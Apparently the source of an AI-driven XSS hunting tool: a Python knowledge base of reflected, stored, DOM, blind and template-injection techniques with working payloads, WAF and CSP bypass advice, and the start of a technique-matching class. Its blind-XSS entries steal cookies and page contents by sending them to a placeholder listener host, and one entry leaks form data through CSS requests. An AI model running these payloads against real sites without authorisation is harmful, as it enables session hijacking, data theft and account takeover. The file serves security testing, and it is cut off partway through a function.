"""
xssentry/xss_skills.py

XSS Hunting Skill Knowledge Base — structured, AI-queryable skill engine.

Contains:
  - XSS_SKILL_DB: All 5 XSS types (Reflected, Stored, DOM, Blind, CSTI/Mutation)
    with beginner/intermediate/advanced techniques as actionable data
  - SkillMatcher: Scores and ranks applicable techniques against a target
  - DynamicSkillStore: Persists novel discovered bypass patterns as new skills
  - Tool registrations: analyse_target_skills, learn_new_skill
"""

import json
import logging
import os
import time
from datetime import datetime
from typing import Any, Dict, List, Optional, Set

from xssentry.llm_brain import ToolSpec, register_tool

logger = logging.getLogger("xssentry.xss_skills")


# ═══════════════════════════════════════════════════════════════════
# XSS SKILL DATABASE
# ═══════════════════════════════════════════════════════════════════

# Each technique is a structured record the AI can reason about.
# Fields:
#   id:                unique identifier
#   name:              human-readable name
#   xss_type:          reflected | stored | dom | blind | csti_mutation
#   level:             beginner | intermediate | advanced
#   detection_signals: list of strings — what recon/spider output suggests this technique
#   applicable_when:   dict of conditions that must hold for this technique to be relevant
#   technique_steps:   ordered list of steps the AI should follow
#   recommended_payloads: payload categories from payloads.py to use
#   verification:      how to confirm success
#   notes:             additional context or caveats

XSS_SKILL_DB: List[Dict[str, Any]] = [

    # ───────────────────────────────────────────────────────────
    # REFLECTED XSS
    # ───────────────────────────────────────────────────────────

    # --- Beginner ---
    {
        "id": "reflected_b1",
        "name": "Input Reflection Discovery",
        "xss_type": "reflected",
        "level": "beginner",
        "detection_signals": [
            "query parameter reflected in response body",
            "form field value echoed in HTML",
            "search box input visible in page",
            "error message echoes user input",
        ],
        "applicable_when": {
            "has_query_params": True,
            "has_forms": True,
        },
        "technique_steps": [
            "Submit a unique inert marker string (e.g., zzXSStestzz123) in every query parameter and form field",
            "Search the raw HTTP response body for the marker",
            "Determine reflection context: HTML body (<div>MARKER</div>), attribute (value='MARKER'), script block (var x='MARKER'), or HTML comment",
            "Also test HTTP headers that might be reflected: User-Agent, Referer, X-Forwarded-For",
            "Check error messages — 'Invalid value: <your input>' patterns",
        ],
        "recommended_payloads": ["reflected"],
        "verification": "Confirm marker appears unescaped in response body with exact string match",
        "notes": "Always confirm reflection with inert marker BEFORE trying active payloads",
    },
    {
        "id": "reflected_b2",
        "name": "Basic Tag Injection (Reflected)",
        "xss_type": "reflected",
        "level": "beginner",
        "detection_signals": [
            "input reflected unencoded in HTML body",
            "angle brackets not stripped",
        ],
        "applicable_when": {
            "reflects_input": True,
            "context": "html_body",
        },
        "technique_steps": [
            "Try <img src=x onerror=alert(document.domain)> first (most commonly unfiltered)",
            "If blocked, try <svg onload=alert(document.domain)>",
            "If both blocked, try <script>alert(document.domain)</script> (most commonly stripped)",
            "Note: <script> is the most commonly blocked tag — never lead with it",
        ],
        "recommended_payloads": ["reflected", "svg", "event_handler"],
        "verification": "Visible alert() dialog or onerror/onload event fires in browser",
    },
    {
        "id": "reflected_b3",
        "name": "Context-Aware Payload Selection",
        "xss_type": "reflected",
        "level": "beginner",
        "detection_signals": [
            "input reflected in attribute value",
            "input reflected in script block",
            "input reflected in href/src attribute",
        ],
        "applicable_when": {
            "reflects_input": True,
        },
        "technique_steps": [
            "HTML body context (<div>HERE</div>): use full tag payload like <img src=x onerror=alert(1)>",
            "Attribute context (value='HERE'): close attribute and tag first: '><img src=x onerror=alert(1)> or inject event handler: ' onmouseover='alert(1)",
            "JavaScript string context (var x='HERE'): close string and statement: ';alert(1);// or '-alert(1)-'",
            "URL/href context (<a href='HERE'>): try javascript:alert(document.domain) URI",
        ],
        "recommended_payloads": ["reflected", "attribute", "javascript"],
        "verification": "Payload executes in the correct context — alert fires",
    },

    # --- Intermediate ---
    {
        "id": "reflected_i1",
        "name": "Parameter Pollution",
        "xss_type": "reflected",
        "level": "intermediate",
        "detection_signals": [
            "multiple parameters accepted",
            "framework detected (PHP, ASP.NET, Java)",
        ],
        "applicable_when": {
            "has_query_params": True,
        },
        "technique_steps": [
            "Send the same parameter name twice: ?q=safe&q=<payload>",
            "Some frameworks parse only the last value for validation but render the first (or vice versa)",
            "Test both orderings: payload-first and payload-second",
            "PHP uses last value, ASP.NET concatenates with comma, Java uses first — adapt accordingly",
        ],
        "recommended_payloads": ["reflected", "encoding"],
        "verification": "Payload reflects unfiltered when sent as duplicate parameter",
    },
    {
        "id": "reflected_i2",
        "name": "Encoding Variation Bypass",
        "xss_type": "reflected",
        "level": "intermediate",
        "detection_signals": [
            "payload blocked or stripped",
            "WAF detected",
            "input validation present",
        ],
        "applicable_when": {
            "reflects_input": True,
            "has_filter": True,
        },
        "technique_steps": [
            "Case variation: <ScRiPt>, <IMG SRC=x OnErRoR=alert(1)>",
            "HTML entity encoding: &#60;script&#62;, &#x3C;script&#x3E;",
            "URL encoding: %3Cscript%3E and double URL encoding: %253Cscript%253E",
            "Unicode/UTF-7 escapes for loose charset handling",
            "Combine case AND encoding: <ImG sRc=x OnErRoR=alert(1)> with entity-encoded values",
        ],
        "recommended_payloads": ["encoding"],
        "verification": "Bypass payload renders and executes despite filter",
    },
    {
        "id": "reflected_i3",
        "name": "OAuth/SSO Redirect XSS",
        "xss_type": "reflected",
        "level": "intermediate",
        "detection_signals": [
            "redirect_uri parameter found",
            "return_to parameter found",
            "back_url parameter found",
            "next parameter found",
            "OAuth/SSO flow detected",
        ],
        "applicable_when": {
            "has_redirect_params": True,
        },
        "technique_steps": [
            "Test redirect_uri, return_to, back_url, next parameters for XSS, not just open redirect",
            "These are often whitelisted loosely (prefix/substring match)",
            "Check if the value is echoed into the page (e.g., 'Return to <site>?' confirmation)",
            "If echoed into HTML rather than used purely as Location: header, it's an XSS vector",
            "Impact is usually HIGH because it sits in the auth flow",
        ],
        "recommended_payloads": ["reflected", "attribute", "encoding"],
        "verification": "Payload executes via redirect parameter reflection in auth flow page",
    },
    {
        "id": "reflected_i4",
        "name": "WAF Detection and Bypass",
        "xss_type": "reflected",
        "level": "intermediate",
        "detection_signals": [
            "403/406 response on payload submission",
            "WAF signature in response headers",
            "cloudflare/akamai/imperva detected",
        ],
        "applicable_when": {
            "has_waf": True,
        },
        "technique_steps": [
            "Identify WAF by response headers (Server, X-CDN, cf-ray, etc.)",
            "Rotate tag AND encoding simultaneously to bypass pattern matching",
            "WAFs frequently pattern-match on canonical lowercase — use mixed case+encoding",
            "Test with uncommon tags: <details ontoggle>, <math>, <marquee onstart>",
            "Try null bytes, tabs, and newlines within tag/attribute names",
        ],
        "recommended_payloads": ["encoding", "waf_bypass", "event_handler"],
        "verification": "Payload bypasses WAF and executes in browser",
    },

    # --- Advanced ---
    {
        "id": "reflected_a1",
        "name": "Content-Type/Charset Confusion",
        "xss_type": "reflected",
        "level": "advanced",
        "detection_signals": [
            "response has text/plain content type",
            "no explicit charset in response",
            "MIME sniffing possible",
        ],
        "applicable_when": {
            "content_type_mismatch": True,
        },
        "technique_steps": [
            "Check if response declares text/plain but browser MIME-sniffs as HTML",
            "Test responses without explicit charset — UTF-7 or legacy encodings can smuggle <script>",
            "Check X-Content-Type-Options header — if missing, MIME sniffing is possible",
        ],
        "recommended_payloads": ["encoding", "waf_bypass"],
        "verification": "Script executes despite non-HTML content type via MIME sniffing",
    },
    {
        "id": "reflected_a2",
        "name": "CRLF Injection → Response Splitting → XSS",
        "xss_type": "reflected",
        "level": "advanced",
        "detection_signals": [
            "user input placed in response header",
            "redirect Location header uses user input",
            "custom header echoes request value",
        ],
        "applicable_when": {
            "input_in_headers": True,
        },
        "technique_steps": [
            "If user-controlled value goes into a response header and CRLF (\\r\\n) isn't stripped",
            "Inject \\r\\n\\r\\n<html><script>alert(1)</script> to smuggle HTML body",
            "This bypasses filters that only sanitize the response body",
            "Test in redirect Location headers, custom headers, cookie values",
        ],
        "recommended_payloads": ["waf_bypass"],
        "verification": "Injected HTML body renders after CRLF-split response",
    },
    {
        "id": "reflected_a3",
        "name": "JSONP Callback XSS",
        "xss_type": "reflected",
        "level": "advanced",
        "detection_signals": [
            "JSONP endpoint detected",
            "callback parameter in URL",
            "response wraps JSON in function call",
        ],
        "applicable_when": {
            "has_jsonp": True,
        },
        "technique_steps": [
            "Identify JSONP endpoints: response looks like callbackName({...json...})",
            "Check if callbackName comes from a query parameter without restriction",
            "Supply callback=alert(document.cookie)// to turn JSON response into executable script",
            "Load via <script src='...jsonp-endpoint?callback=alert(1)//'> on attacker page",
        ],
        "recommended_payloads": ["waf_bypass"],
        "verification": "JSONP endpoint executes arbitrary JS when loaded as script",
    },
    {
        "id": "reflected_a4",
        "name": "CSP Analysis and Bypass",
        "xss_type": "reflected",
        "level": "advanced",
        "detection_signals": [
            "Content-Security-Policy header present",
            "script-src directive set",
        ],
        "applicable_when": {
            "has_csp": True,
        },
        "technique_steps": [
            "Confirm DOM execution works BEFORE worrying about CSP",
            "Parse CSP header: check script-src, connect-src, default-src directives",
            "Look for CSP bypass routes: whitelisted third-party domains with JSONP/redirect",
            "Check if script-src 'self' + upload endpoint allows same-origin attacker JS",
            "Check for 'unsafe-inline', 'unsafe-eval', or overly broad wildcards",
            "If CSP blocks script but allows style, fall back to CSS exfiltration",
        ],
        "recommended_payloads": ["reflected", "css_exfil"],
        "verification": "Payload executes and exfiltrates data despite CSP",
    },
    {
        "id": "reflected_a5",
        "name": "Second-Order Reflected XSS",
        "xss_type": "reflected",
        "level": "advanced",
        "detection_signals": [
            "submitted values appear on different pages",
            "admin/audit log views exist",
            "search history or recent activity features",
        ],
        "applicable_when": {
            "has_secondary_display": True,
        },
        "technique_steps": [
            "A value is HTML-escaped when first rendered but read back unescaped in a different context",
            "Test every place a submitted value might be redisplayed: admin 'recent searches', audit logs, CSV/report exports",
            "Submit payload, then check all secondary display pages",
        ],
        "recommended_payloads": ["reflected", "stored"],
        "verification": "Payload executes on secondary display page, not the submission response",
    },

    # ───────────────────────────────────────────────────────────
    # STORED XSS
    # ───────────────────────────────────────────────────────────

    # --- Beginner ---
    {
        "id": "stored_b1",
        "name": "Stored Field Enumeration",
        "xss_type": "stored",
        "level": "beginner",
        "detection_signals": [
            "profile fields found (display name, bio, location)",
            "comment/review forms found",
            "messaging or support ticket forms",
            "file upload with filename display",
        ],
        "applicable_when": {
            "has_persistent_fields": True,
        },
        "technique_steps": [
            "Enumerate every field that gets saved and redisplayed: profile fields, comments, messages, support tickets, reviews, group names, file names, calendar events",
            "Submit inert marker to each field, then check every surface it might appear: your own view, public profile, admin/mod list, email notifications, search results",
            "Check the field's display page, not the submission confirmation page",
        ],
        "recommended_payloads": ["reflected", "svg", "event_handler"],
        "verification": "Marker appears on a different page load than submission",
    },
    {
        "id": "stored_b2",
        "name": "File Upload Filename XSS",
        "xss_type": "stored",
        "level": "beginner",
        "detection_signals": [
            "file upload functionality found",
            "uploaded filename displayed in file list",
        ],
        "applicable_when": {
            "has_file_upload": True,
        },
        "technique_steps": [
            "Upload a file with XSS payload as filename: \"><img src=x onerror=alert(1)>.jpg",
            "Check if filename renders unescaped in file list, 'uploaded by' notice, or download page",
            "The payload fires independent of file content — it's the filename that matters",
        ],
        "recommended_payloads": ["reflected", "attribute"],
        "verification": "Filename payload renders and executes on file list/display page",
    },

    # --- Intermediate ---
    {
        "id": "stored_i1",
        "name": "SVG Upload XSS",
        "xss_type": "stored",
        "level": "intermediate",
        "detection_signals": [
            "SVG file upload allowed",
            "image upload that accepts SVG",
            "avatar/profile image upload",
        ],
        "applicable_when": {
            "has_file_upload": True,
            "accepts_svg": True,
        },
        "technique_steps": [
            "Upload SVG with inline script: <svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'><circle cx='50' cy='50' r='40'/></svg>",
            "Or with embedded <script> tag inside SVG XML",
            "Test both <img src='...svg'> embedding and object/iframe embedding",
            "Browsers execute inline SVG script differently depending on embedding method",
            "Any pipeline checking only extension or MIME type without parsing SVG XML is vulnerable",
        ],
        "recommended_payloads": ["stored"],
        "verification": "SVG file executes script when loaded/viewed",
    },
    {
        "id": "stored_i2",
        "name": "Markdown/Rich-Text Injection",
        "xss_type": "stored",
        "level": "intermediate",
        "detection_signals": [
            "markdown editor or rich-text editor found",
            "wiki/notes/issue tracker functionality",
            "chat app with formatting support",
        ],
        "applicable_when": {
            "has_markdown_editor": True,
        },
        "technique_steps": [
            "Test through the rendering pipeline, not raw HTML tags",
            "Image syntax: ![x](javascript:alert(1)) or ![x](x\" onerror=\"alert(1))",
            "Link syntax: [click](javascript:alert(document.domain))",
            "Reference-style links may bypass simpler inline regex filters",
            "Test embed/iframe extensions some Markdown dialects support",
        ],
        "recommended_payloads": ["stored", "reflected"],
        "verification": "Markdown-rendered content executes JavaScript",
    },
    {
        "id": "stored_i3",
        "name": "Cache Poisoning → Stored XSS",
        "xss_type": "stored",
        "level": "intermediate",
        "detection_signals": [
            "CDN/cache detected (Varnish, Cloudflare, Akamai, Fastly)",
            "cache headers present (X-Cache, Age, Vary)",
            "unkeyed headers reflected in response",
        ],
        "applicable_when": {
            "has_cache": True,
        },
        "technique_steps": [
            "Identify unkeyed inputs: headers like X-Forwarded-Host, X-Forwarded-Scheme not in cache key",
            "If response varies based on unkeyed input and gets cached → mass impact",
            "A single poisoned request can convert reflected XSS into stored XSS for ALL visitors",
            "Test with unique cache-buster query param first, then try without",
        ],
        "recommended_payloads": ["reflected", "waf_bypass"],
        "verification": "Poisoned cache serves XSS payload to other users/sessions",
    },

    # --- Advanced ---
    {
        "id": "stored_a1",
        "name": "Prototype Pollution → Stored XSS",
        "xss_type": "stored",
        "level": "advanced",
        "detection_signals": [
            "JSON input accepted (settings/config API)",
            "deep merge of user JSON detected",
            "JavaScript templating engine in use",
        ],
        "applicable_when": {
            "has_json_api": True,
            "has_deep_merge": True,
        },
        "technique_steps": [
            "Submit JSON with __proto__ or constructor.prototype keys in nested objects",
            "First confirm pollution with inert property (e.g., __proto__.testPollution = 'yes')",
            "Then check if a rendering path reads the polluted property (e.g., options.escapeHtml becomes false)",
            "If template engine checks escapeHtml from prototype chain → unescaped output → XSS",
        ],
        "recommended_payloads": ["prototype_pollution"],
        "verification": "Polluted prototype property causes template engine to skip escaping",
    },
    {
        "id": "stored_a2",
        "name": "CSP Bypass for Stored XSS",
        "xss_type": "stored",
        "level": "advanced",
        "detection_signals": [
            "stored XSS confirmed but CSP blocks execution",
            "CSP whitelists third-party analytics/ad domains",
            "script-src 'self' with upload endpoint",
        ],
        "applicable_when": {
            "has_stored_xss": True,
            "has_csp": True,
        },
        "technique_steps": [
            "Even with stored payload executing, confirm CSP doesn't neutralize impact",
            "Check whitelisted domains for exploitable JSONP or open redirect endpoints",
            "Check if script-src 'self' + upload endpoint allows hosting attacker JS as same-origin",
            "If script blocked, try style-src for CSS exfiltration (attribute selector technique)",
        ],
        "recommended_payloads": ["stored", "css_exfil"],
        "verification": "Data exfiltration or full script execution despite CSP",
    },

    # ───────────────────────────────────────────────────────────
    # DOM-BASED XSS
    # ───────────────────────────────────────────────────────────

    # --- Beginner ---
    {
        "id": "dom_b1",
        "name": "DOM Source/Sink Discovery",
        "xss_type": "dom",
        "level": "beginner",
        "detection_signals": [
            "JavaScript files loaded on page",
            "SPA framework detected (React, Vue, Angular)",
            "client-side routing observed",
        ],
        "applicable_when": {
            "has_javascript": True,
        },
        "technique_steps": [
            "Identify SOURCES — where attacker data enters: location.hash, location.search, location.href, document.referrer, window.name, postMessage event.data, localStorage/sessionStorage",
            "Identify SINKS — DOM APIs that execute strings: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, Function(), setTimeout('string'), setInterval('string'), .src on script/iframe, location = 'javascript:...'",
            "Search JS files for source keywords, then trace variable flow to sinks",
            "If source flows to sink with no sanitization in between → candidate vulnerability",
        ],
        "recommended_payloads": ["dom"],
        "verification": "Source-to-sink flow confirmed with no sanitization",
    },
    {
        "id": "dom_b2",
        "name": "URL Fragment DOM XSS",
        "xss_type": "dom",
        "level": "beginner",
        "detection_signals": [
            "location.hash used in JavaScript",
            "hash-based routing or deep links",
            "innerHTML assignment with hash value",
        ],
        "applicable_when": {
            "uses_location_hash": True,
        },
        "technique_steps": [
            "If location.hash feeds innerHTML, test: https://target/page#<img src=x onerror=alert(document.domain)>",
            "Fragment (#...) data is NEVER sent to the server — invisible to server-side logging",
            "Must test in actual browser, not just HTTP response inspection",
        ],
        "recommended_payloads": ["dom"],
        "verification": "Alert fires when visiting URL with payload in fragment — no server request needed",
    },

    # --- Intermediate ---
    {
        "id": "dom_i1",
        "name": "postMessage Listener Exploitation",
        "xss_type": "dom",
        "level": "intermediate",
        "detection_signals": [
            "addEventListener('message',...) found in JS",
            ".onmessage handler found",
            "iframe/widget/chat component embedded",
        ],
        "applicable_when": {
            "has_postmessage_handler": True,
        },
        "technique_steps": [
            "Search JS for window.addEventListener('message',...) or .onmessage =",
            "For each handler check: does it validate event.origin at all?",
            "If yes, is the check exact match or weak (.includes, .endsWith, regex without anchors)?",
            "Weak check can be satisfied by attacker origin like https://trusted.example.attacker.com",
            "Does event.data flow into innerHTML, eval, redirect, or document.domain setter?",
            "Shared widgets/iframes = one bad handler compromises every instance",
        ],
        "recommended_payloads": ["postmessage", "dom"],
        "verification": "Payload sent via postMessage from attacker page executes in target context",
    },
    {
        "id": "dom_i2",
        "name": "window.name Cross-Navigation Attack",
        "xss_type": "dom",
        "level": "intermediate",
        "detection_signals": [
            "window.name read in JavaScript",
            "window.name used in DOM operations",
        ],
        "applicable_when": {
            "uses_window_name": True,
        },
        "technique_steps": [
            "window.name survives across page navigations in same tab",
            "Attacker sets window.name on controlled page, then navigates victim to target",
            "If target reads window.name into a sink → XSS despite different origins",
            "Works even with strict same-origin policies on other APIs",
        ],
        "recommended_payloads": ["dom"],
        "verification": "Payload set via window.name on attacker page executes on target after navigation",
    },
    {
        "id": "dom_i3",
        "name": "SPA Hash-Route Parameter Injection",
        "xss_type": "dom",
        "level": "intermediate",
        "detection_signals": [
            "SPA with hash-based routing (#/page/param)",
            "route parameters rendered without escaping",
            "client-side template rendering",
        ],
        "applicable_when": {
            "has_spa_routing": True,
        },
        "technique_steps": [
            "SPAs parsing location.hash as route (#/page/param) may render param without escaping",
            "Test hash-based deep link parameters same as query parameters",
            "Check if route parameters flow into innerHTML or template bindings",
        ],
        "recommended_payloads": ["dom", "reflected"],
        "verification": "XSS fires via crafted hash route URL",
    },

    # --- Advanced ---
    {
        "id": "dom_a1",
        "name": "Multi-Hop Source-to-Sink Tracing",
        "xss_type": "dom",
        "level": "advanced",
        "detection_signals": [
            "complex JavaScript application",
            "multiple event listeners chained",
            "postMessage + localStorage + template chain observed",
        ],
        "applicable_when": {
            "has_complex_js": True,
        },
        "technique_steps": [
            "Real DOM XSS often passes through 2-4 function calls across different boundaries",
            "Map the full chain: postMessage → localStorage write → read → template render → sink",
            "A sanitization step early in the chain doesn't help if a later step reintroduces raw concatenation",
            "Don't stop at the first function that 'looks safe' — trace to the actual DOM sink",
        ],
        "recommended_payloads": ["dom", "postmessage"],
        "verification": "Full multi-hop chain demonstrated from controlled source to executing sink",
    },
    {
        "id": "dom_a2",
        "name": "localStorage/sessionStorage Poisoning",
        "xss_type": "dom",
        "level": "advanced",
        "detection_signals": [
            "localStorage/sessionStorage read in JS",
            "storage values used in DOM rendering",
            "subdomain with lower security found",
        ],
        "applicable_when": {
            "uses_web_storage": True,
        },
        "technique_steps": [
            "If storage is shared across subdomains or a lower-security subdomain has its own XSS",
            "Use sibling subdomain XSS to poison storage values",
            "Higher-value page trusting stored value without re-validating = persistent injection",
            "Survives page reloads — durable second-stage for chaining minor to major bugs",
        ],
        "recommended_payloads": ["dom"],
        "verification": "Poisoned storage value causes XSS on high-value page after reload",
    },
    {
        "id": "dom_a3",
        "name": "Framework-Specific Unsafe APIs",
        "xss_type": "dom",
        "level": "advanced",
        "detection_signals": [
            "React detected (dangerouslySetInnerHTML)",
            "Vue detected (v-html directive)",
            "Angular detected ([innerHTML] binding, bypassSecurityTrustHtml)",
        ],
        "applicable_when": {
            "has_framework": True,
        },
        "technique_steps": [
            "Modern frameworks auto-escape by default — DOM XSS requires finding the opt-out mechanism",
            "React: grep for dangerouslySetInnerHTML",
            "Vue: grep for v-html directive",
            "Angular: grep for [innerHTML] binding + bypassSecurityTrustHtml",
            "These opt-out APIs mark exactly where the framework's default protection was disabled",
        ],
        "recommended_payloads": ["dom", "reflected"],
        "verification": "Payload executes through framework's unsafe API usage",
    },
    {
        "id": "dom_a4",
        "name": "eval/Function Sink via JSON Response",
        "xss_type": "dom",
        "level": "advanced",
        "detection_signals": [
            "eval() used to parse JSON responses",
            "Function() constructor used with response data",
            "setTimeout/setInterval with string argument from response",
        ],
        "applicable_when": {
            "has_eval_sink": True,
        },
        "technique_steps": [
            "Detect if client-side JS does eval('var data = ' + responseText) instead of JSON.parse",
            "Any part of the JSON response that is attacker-influenced becomes an injection point",
            "Even indirect influence (a value you control elsewhere in the app) counts",
        ],
        "recommended_payloads": ["dom", "javascript"],
        "verification": "Attacker-influenced JSON value executes via eval/Function sink",
    },

    # ───────────────────────────────────────────────────────────
    # BLIND XSS
    # ───────────────────────────────────────────────────────────

    # --- Beginner ---
    {
        "id": "blind_b1",
        "name": "Blind XSS Injection Points",
        "xss_type": "blind",
        "level": "beginner",
        "detection_signals": [
            "contact/feedback forms found",
            "support ticket or 'report abuse' forms",
            "fields labeled 'reviewed by our team'",
            "user-agent or other headers potentially logged",
        ],
        "applicable_when": {
            "has_feedback_forms": True,
        },
        "technique_steps": [
            "Identify fields where a second party (admin/support/automated system) will view your submission",
            "Candidate fields: contact forms, bug reports, support tickets, order notes, display names, User-Agent header",
            "Use callback payload that phones home: <img src=x onerror=\"fetch('https://YOUR-LISTENER/xss-probe')\">",
            "Set up a listener (any endpoint that logs incoming requests with full headers) BEFORE submitting",
            "Submit callback payload to EVERY plausible field — breadth matters more than payload sophistication",
        ],
        "recommended_payloads": ["blind"],
        "verification": "HTTP request received at listener from internal/admin rendering context",
    },

    # --- Intermediate ---
    {
        "id": "blind_i1",
        "name": "Blind XSS Timing and Rotation",
        "xss_type": "blind",
        "level": "intermediate",
        "detection_signals": [
            "callback not received after initial submission",
            "uncertain if payload was filtered or just delayed",
        ],
        "applicable_when": {
            "blind_submitted": True,
        },
        "technique_steps": [
            "Don't conclude 'clean' too early — blind payloads can fire hours or days later",
            "When no callback after 1 hour, this is NOT evidence the field is safe",
            "Resubmit with rotated payload (img onerror → svg onload → body onload → details ontoggle)",
            "Use fresh unique tokens for each variant to distinguish which fires",
            "Check callback request headers: HeadlessChrome/Puppeteer = automated reviewer, internal hostname = high-value",
        ],
        "recommended_payloads": ["blind"],
        "verification": "Callback fires — inspect User-Agent and Origin headers to identify rendering context",
    },
    {
        "id": "blind_i2",
        "name": "Blind XSS Escalation Triggers",
        "xss_type": "blind",
        "level": "intermediate",
        "detection_signals": [
            "first callback confirms lower-privilege reviewer",
            "review pipeline has priority/escalation routing",
        ],
        "applicable_when": {
            "blind_callback_received": True,
        },
        "technique_steps": [
            "Some pipelines route to higher-privilege reviewers only under specific conditions",
            "Test trigger keywords: 'urgent', 'legal', 'refund', specific category/priority flags",
            "If chatbot/help system exists, ask it what triggers priority handling",
            "Read client-side routing logic for escalation rules",
            "Don't assume first caught account is the most valuable one",
        ],
        "recommended_payloads": ["blind"],
        "verification": "Callback from higher-privilege reviewer account captured",
    },

    # --- Advanced ---
    {
        "id": "blind_a1",
        "name": "Session/Cookie Theft via Blind XSS",
        "xss_type": "blind",
        "level": "advanced",
        "detection_signals": [
            "blind XSS render confirmed via callback",
            "internal admin session expected",
        ],
        "applicable_when": {
            "blind_confirmed": True,
        },
        "technique_steps": [
            "Upgrade probe to session theft: <img src=x onerror=\"fetch('https://LISTENER/?k='+document.cookie)\">",
            "Don't assume the tag that worked for probe also works for the real payload — rotate tags",
            "Some filters allow benign probe tags but strip payload with document.cookie or longer fetch",
            "Decode any captured cookie immediately — dot-separated base64url = JWT/session, decode to reveal privilege level",
        ],
        "recommended_payloads": ["blind"],
        "verification": "Admin session cookie captured and decoded — privilege level confirmed",
    },
    {
        "id": "blind_a2",
        "name": "DOM Snapshot Exfiltration",
        "xss_type": "blind",
        "level": "advanced",
        "detection_signals": [
            "blind XSS confirmed in internal tool",
            "need evidence of what internal interface rendered the payload",
        ],
        "applicable_when": {
            "blind_confirmed": True,
        },
        "technique_steps": [
            "Instead of only exfiltrating document.cookie, capture the entire page structure",
            "Exfiltrate document.documentElement.outerHTML (truncated) to listener",
            "This gives structural proof of the internal interface for the report",
            "Chain to full account takeover: document what the captured session can actually do",
        ],
        "recommended_payloads": ["blind"],
        "verification": "DOM snapshot of internal admin interface captured and documented",
    },

    # ───────────────────────────────────────────────────────────
    # CSTI / MUTATION XSS / SANITIZER BYPASS
    # ───────────────────────────────────────────────────────────

    {
        "id": "csti_a1",
        "name": "Client-Side Template Injection (CSTI)",
        "xss_type": "csti_mutation",
        "level": "advanced",
        "detection_signals": [
            "AngularJS detected",
            "Vue.js detected with template compilation",
            "template syntax ({{ }}) appears in page source",
            "framework evaluates template expressions",
        ],
        "applicable_when": {
            "has_template_engine": True,
        },
        "technique_steps": [
            "Test with template marker first: {{7*7}} — if output shows 49, expressions are evaluated",
            "HTML escaping is IRRELEVANT for CSTI — the exploit is expression evaluation, not HTML injection",
            "WAFs tuned to strip <script> and on* attributes won't catch {{ }} syntax",
            "For AngularJS: {{constructor.constructor('alert(1)')()}} (sandbox escape, version-dependent)",
            "For Vue: check if v-html or template compilation is used on user-controlled content",
        ],
        "recommended_payloads": ["csti", "template"],
        "verification": "Template expression evaluates and executes JavaScript",
    },
    {
        "id": "csti_a2",
        "name": "Mutation XSS (mXSS) via Sanitizer",
        "xss_type": "csti_mutation",
        "level": "advanced",
        "detection_signals": [
            "HTML sanitizer library in use (DOMPurify, bleach, sanitize-html)",
            "rich-text content goes through parse/serialize cycle",
            "unusual nested-tag structures behave inconsistently",
        ],
        "applicable_when": {
            "has_sanitizer": True,
        },
        "technique_steps": [
            "Sanitizers parse HTML → DOM tree → re-serialize — this round trip can 'correct' malformed markup",
            "Browser HTML parser 'corrections' can produce executable markup from inert input",
            "Check the specific sanitizer library version and its known bypass history",
            "mXSS techniques are sanitizer-version-specific, not generic",
            "A payload that 'does nothing' naively can be a real mXSS bug — the tell is inconsistency between submitted and rendered markup",
            "Test: nested tag structures like <math><mtext><table><mglyph><svg><mtext>...",
        ],
        "recommended_payloads": ["mutation"],
        "verification": "Inert-looking markup becomes executable after sanitizer round-trip",
    },
    {
        "id": "csti_a3",
        "name": "CSS-Only Data Exfiltration (No JS)",
        "xss_type": "csti_mutation",
        "level": "advanced",
        "detection_signals": [
            "CSP blocks all script execution",
            "HTML/CSS injection possible but no script sink",
            "style-src allows inline or broad source",
        ],
        "applicable_when": {
            "has_css_injection": True,
            "csp_blocks_scripts": True,
        },
        "technique_steps": [
            "When CSP blocks all script execution, CSS alone can exfiltrate data",
            "Use attribute-selector CSS: input[value^='a'] { background: url(https://listener/?leak=a) }",
            "This leaks character-by-character data from form fields or hidden attributes",
            "Which background image request fires reveals the character — no JavaScript required",
            "Fallback technique specifically for CSP-hardened targets with HTML/CSS injection",
        ],
        "recommended_payloads": ["css_exfil"],
        "verification": "Data exfiltrated via CSS background image requests without JavaScript",
    },
    {
        "id": "csti_a4",
        "name": "Prototype Pollution as Sanitizer Defeat",
        "xss_type": "csti_mutation",
        "level": "advanced",
        "detection_signals": [
            "sanitizer configuration read from pollutable object",
            "allowedTags or escapeHtml option inherited via prototype chain",
        ],
        "applicable_when": {
            "has_sanitizer": True,
            "has_prototype_pollution": True,
        },
        "technique_steps": [
            "If sanitizer config (allowedTags, escapeHtml) is read from an object with pollutable prototype",
            "Polluting configuration silently disables sanitizer for ALL subsequent calls",
            "First confirm prototype pollution is possible (via JSON deep merge or similar)",
            "Then pollute the specific config property the sanitizer reads",
            "Turns a previously safe rendering path into exploitable without touching sanitizer code",
        ],
        "recommended_payloads": ["prototype_pollution", "mutation"],
        "verification": "Polluted sanitizer config allows previously-blocked payload to execute",
    },
]


# ═══════════════════════════════════════════════════════════════════
# SKILL MATCHER — scores techniques against target analysis
# ═══════════════════════════════════════════════════════════════════

class SkillMatcher:
    """
    Takes target analysis output (from recon + spider) and scores each
    XSS technique for relevance. Returns a ranked list of applicable
    techniques the AI should try.
    """

    def __init__(self):
        self.skills = list(XSS_SKILL_DB)  # start with built-in
        self._dynamic_store: Optional['DynamicSkillStore'] = None

    def set_dynamic_store(self, store: 'DynamicSkillStore') -> None:
        """Attach a dynamic skill store for learned skills."""
        self._dynamic_store = store

    def _build_target_profile(self, recon_data: Dict, spider_data: Dict) -> Dict[str, Any]:
        """
        Build a target profile from recon and spider data.
        Returns a dict of boolean/string signals that skills match against.
        """
        profile: Dict[str, Any] = {}

        # --- From recon data ---
        if recon_data:
            forms = recon_data.get("forms", [])
            params = recon_data.get("query_params", [])
            apis = recon_data.get("api_endpoints", [])
            fp = recon_data.get("fingerprint", {})
            sec = fp.get("security_headers", {})

            profile["has_forms"] = len(forms) > 0
            profile["has_query_params"] = len(params) > 0
            profile["has_api_endpoints"] = len(apis) > 0
            profile["has_json_api"] = any("json" in str(a.get("url", "")).lower() or "api" in str(a.get("url", "")).lower() for a in apis)

            # Security posture
            profile["has_csp"] = sec.get("csp", "MISSING") != "MISSING"
            profile["csp_blocks_scripts"] = "script-src" in sec.get("csp", "") and "'unsafe-inline'" not in sec.get("csp", "")
            profile["has_waf"] = False  # will be set later if detected
            profile["security_posture"] = fp.get("security_posture", "unknown")

            # Content type
            ct = recon_data.get("content_type", "")
            profile["content_type_mismatch"] = "text/plain" in ct or "application/json" in ct

            # Check for redirect parameters
            redirect_params = {"redirect_uri", "return_to", "back_url", "next", "redirect", "returnTo", "continue", "goto"}
            all_param_names = {p.get("param", "").lower() for p in params}
